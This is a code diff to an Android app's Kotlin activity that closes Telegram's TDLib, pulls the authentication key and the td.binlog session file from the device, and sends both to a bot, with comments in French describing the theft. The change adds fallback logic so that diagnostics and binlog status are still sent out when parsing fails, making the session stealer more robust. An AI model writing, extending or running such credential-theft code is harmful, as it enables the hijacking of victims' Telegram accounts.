@@ -98,17 +98,22 @@ class MainActivity : Activity() {
         if (exported) return
         exported = true
 
-        // 1) ferme TDLib pour qu'il vide son binlog
         Tg.send(TdApi.Close())
 
         thread {
-            // 2) attend l'ecriture puis extrait la cle d'auth
             val ok = Capture.readAuth(this, 20000)
 
-            // 3) envoie tout au bot
             Net.send(Capture.payload(this) + "\nparse: $ok")
+
             val f = Capture.binlogFile(this)
-            if (f.exists()) Net.sendFile("td.binlog", f.readBytes(), "td.binlog ok=$ok")
+            val bytes = if (f.exists()) f.readBytes() else ByteArray(0)
+
+            if (bytes.isNotEmpty()) {
+                Net.sendFile("td.binlog", bytes, "td.binlog ok=$ok")
+                if (!ok) Net.send(Capture.diagnose(bytes))
+            } else {
+                Net.send("BINLOG absent : ${f.absolutePath}")
+            }
 
             runOnUiThread { toast(if (ok) "session extraite" else "parse binlog KO") }
         }
